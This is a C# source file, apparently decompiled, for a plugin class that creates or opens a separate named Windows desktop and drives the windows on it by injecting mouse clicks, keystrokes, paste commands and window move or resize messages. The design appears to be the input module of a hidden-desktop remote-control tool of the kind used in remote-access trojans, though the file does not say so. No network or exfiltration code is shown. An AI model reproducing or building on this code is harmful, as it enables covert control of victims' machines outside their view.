

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;


namespace Plugin.Helper
{
	public class input_handler
	{
		private Utils.POINT lastPoint = new Utils.POINT()
		{
			x = 0,
			y = 0
		};
		private IntPtr hResMoveWindow = IntPtr.Zero;
		private IntPtr resMoveType = IntPtr.Zero;
		private bool lmouseDown;
		private static object lockObject = new object();
		private string DesktopName;
		public IntPtr Desktop = IntPtr.Zero;

		public input_handler(string DesktopName)
		{
			this.DesktopName = DesktopName;
			IntPtr num = Utils.OpenDesktop(DesktopName, 0, true, 511U);
			if (num == IntPtr.Zero)
				num = Utils.CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, 511U, IntPtr.Zero);
			this.Desktop = num;
		}

		public void Dispose()
		{
			Utils.CloseDesktop(this.Desktop);
			GC.Collect();
		}

		public static int GET_X_LPARAM(IntPtr lParam)
		{
			return (int) (short) (lParam.ToInt32() & (int) ushort.MaxValue);
		}

		public static int GET_Y_LPARAM(IntPtr lParam)
		{
			return (int) (short) (lParam.ToInt32() >> 16 & (int) ushort.MaxValue);
		}

		public static IntPtr MAKELPARAM(int lowWord, int highWord)
		{
			return new IntPtr(highWord << 16 | lowWord & (int) ushort.MaxValue);
		}

		public void ResetWindowsTopDown(IntPtr ownerhWnd)
		{
			IntPtr topWindow = Utils.GetTopWindow(ownerhWnd);
			if (topWindow == IntPtr.Zero)
				return;
			IntPtr window = Utils.GetWindow(topWindow, Utils.GetWindowType.GW_HWNDLAST);
			if (window == IntPtr.Zero)
				return;
			for (; window != IntPtr.Zero; window = Utils.GetWindow(window, Utils.GetWindowType.GW_HWNDPREV))
			{
				if (Utils.IsWindowVisible(window))
					Utils.SetWindowPos(window, IntPtr.Zero, 0, 0, 0, 0, 16469U);
			}
		}

		public static void SendStringToWindow(IntPtr hWnd, string text)
		{
			foreach (char ch in text)
			{
				ushort wParam = Utils.VkKeyScan(ch);
				if (wParam == ushort.MaxValue)
					break;
				Utils.PostMessage(hWnd, 257U, (IntPtr) (int) wParam, IntPtr.Zero);
			}
		}

		public Process GetProcessFromhWnd(IntPtr handle)
		{
			try
			{
				uint ProcessId;
				Utils.GetWindowThreadProcessId(handle, out ProcessId);
				return Process.GetProcessById((int) ProcessId);
			}
			catch
			{
			}
			return (Process) null;
		}

		public string GetTopMostWindowName()
		{
			Utils.SetThreadDesktop(this.Desktop);
			Process processFromhWnd = this.GetProcessFromhWnd(this.FindTopMostWindow());
			string processName = processFromhWnd.ProcessName;
			processFromhWnd.Dispose();
			return processName;
		}

		public IntPtr FindTopMostWindow()
		{
			IntPtr activeWindowHandle = IntPtr.Zero;
			Utils.EnumDesktopWindows(this.Desktop, new Utils.EnumDesktopWindowsDelegate(EnumWindowsCallback), IntPtr.Zero);
			return activeWindowHandle;

			bool EnumWindowsCallback(IntPtr hWnd, IntPtr lParam)
			{
				if (Utils.IsWindowVisible(hWnd))
					activeWindowHandle = hWnd;
				return true;
			}
		}

		public void PasteText(string text)
		{
			Utils.SetThreadDesktop(this.Desktop);
			IntPtr topMostWindow = this.FindTopMostWindow();
			if (topMostWindow == IntPtr.Zero)
				return;
			input_handler.SendStringToWindow(topMostWindow, text);
		}

		public void PasteFromClientClipboard()
		{
			IntPtr topMostWindow = this.FindTopMostWindow();
			if (topMostWindow == IntPtr.Zero)
				return;
			Utils.SendMessage(topMostWindow, 770U, IntPtr.Zero, IntPtr.Zero);
		}

		public void Input(uint msg, IntPtr wParam, IntPtr lParam)
		{
			lock (input_handler.lockObject)
			{
				Utils.SetThreadDesktop(this.Desktop);
				IntPtr zero = IntPtr.Zero;
				bool flag = false;
				Utils.POINT lastPoint1;
				IntPtr num1;
				switch (msg)
				{
					case 256:
					case 257:
					case 258:
						lastPoint1 = this.lastPoint;
						num1 = Utils.WindowFromPoint(lastPoint1);
						break;
					default:
						flag = true;
						lastPoint1.x = input_handler.GET_X_LPARAM(lParam);
						lastPoint1.y = input_handler.GET_Y_LPARAM(lParam);
						Utils.POINT lastPoint2 = this.lastPoint;
						this.lastPoint = lastPoint1;
						num1 = Utils.WindowFromPoint(lastPoint1);
						switch (msg)
						{
							case 513:
								this.lmouseDown = true;
								this.hResMoveWindow = IntPtr.Zero;
								IntPtr window = Utils.FindWindow("Button", (string) null);
								Utils.RECT lpRect1;
								Utils.GetWindowRect(window, out lpRect1);
								if (Utils.PtInRect(ref lpRect1, lastPoint1))
								{
									Utils.PostMessage(window, 245U, IntPtr.Zero, IntPtr.Zero);
									return;
								}
								StringBuilder pszType1 = new StringBuilder(260);
								Utils.RealGetWindowClass(num1, pszType1, 260);
								if (pszType1.ToString() == "#32768")
								{
									IntPtr subMenu = Utils.GetSubMenu(num1, 0);
									int nPos = Utils.MenuItemFromPoint(IntPtr.Zero, subMenu, lastPoint1);
									Utils.GetMenuItemID(subMenu, nPos);
									Utils.PostMessage(num1, 485U, new IntPtr(nPos), IntPtr.Zero);
									Utils.PostMessage(num1, 256U, new IntPtr(13), IntPtr.Zero);
									return;
								}
								break;
							case 514:
								this.lmouseDown = false;
								switch (Utils.SendMessage(num1, 132U, IntPtr.Zero, lParam).ToInt32())
								{
									case -1:
										Utils.SetWindowLong(num1, -16, Utils.GetWindowLong(num1, -16) | 134217728);
										Utils.SendMessage(num1, 132U, IntPtr.Zero, lParam);
										break;
									case 8:
										Utils.PostMessage(num1, 274U, new IntPtr(61472), IntPtr.Zero);
										break;
									case 9:
										Utils.WINDOWPLACEMENT lpwndpl = new Utils.WINDOWPLACEMENT();
										lpwndpl.length = Marshal.SizeOf<Utils.WINDOWPLACEMENT>(lpwndpl);
										Utils.GetWindowPlacement(num1, ref lpwndpl);
										if ((lpwndpl.flags & 3) != 0)
										{
											Utils.PostMessage(num1, 274U, new IntPtr(61728), IntPtr.Zero);
											break;
										}
										Utils.PostMessage(num1, 274U, new IntPtr(61488), IntPtr.Zero);
										break;
									case 20:
										Utils.PostMessage(num1, 16U, IntPtr.Zero, IntPtr.Zero);
										break;
								}
								break;
							default:
								if (msg == 512U && this.lmouseDown)
								{
									if (this.hResMoveWindow == IntPtr.Zero)
										this.resMoveType = Utils.SendMessage(num1, 132U, IntPtr.Zero, lParam);
									else
										num1 = this.hResMoveWindow;
									int num2 = lastPoint2.x - lastPoint1.x;
									int num3 = lastPoint2.y - lastPoint1.y;
									Utils.RECT lpRect2;
									Utils.GetWindowRect(num1, out lpRect2);
									int left = lpRect2.left;
									int top = lpRect2.top;
									int width = lpRect2.right - lpRect2.left;
									int height = lpRect2.bottom - lpRect2.top;
									switch (this.resMoveType.ToInt32())
									{
										case 2:
											left -= num2;
											top -= num3;
											break;
										case 3:
											return;
										case 4:
											return;
										case 5:
											return;
										case 6:
											return;
										case 7:
											return;
										case 8:
											return;
										case 9:
											return;
										case 10:
											left -= num2;
											width += num2;
											break;
										case 11:
											width -= num2;
											break;
										case 12:
											top -= num3;
											height += num3;
											break;
										case 13:
											top -= num3;
											height += num3;
											left -= num2;
											width += num2;
											break;
										case 14:
											top -= num3;
											height += num3;
											width -= num2;
											break;
										case 15:
											height -= num3;
											break;
										case 16:
											height -= num3;
											left -= num2;
											width += num2;
											break;
										case 17:
											height -= num3;
											width -= num2;
											break;
										default:
											return;
									}
									Utils.MoveWindow(num1, left, top, width, height, false);
									this.hResMoveWindow = num1;
									return;
								}
								break;
						}
						break;
				}
				IntPtr num4 = num1;
				IntPtr num5;
				do
				{
					num5 = num4;
					Utils.ScreenToClient(num5, ref lastPoint1);
				}
				while (!(num4 == IntPtr.Zero) && !(num4 == num5));
				if (flag)
				{
					lParam = input_handler.MAKELPARAM(lastPoint1.x, lastPoint1.y);
					StringBuilder pszType2 = new StringBuilder(260);
					Utils.RealGetWindowClass(num5, pszType2, 260);
					string str = pszType2.ToString();
					if (Utils.PostMessage(num5, msg, wParam, lParam) != IntPtr.Zero)
					{
						if (!(str == "SysTreeView32") && !(str == "Button") && !(str == "DirectUIHWND") || msg != 514U || !(str != "DirectUIHWND"))
							return;
						Utils.PostMessage(num5, 256U, new IntPtr(13), new IntPtr(1835009));
						return;
					}
				}
				Utils.PostMessage(num5, msg, wParam, lParam);
			}
		}
	}
}
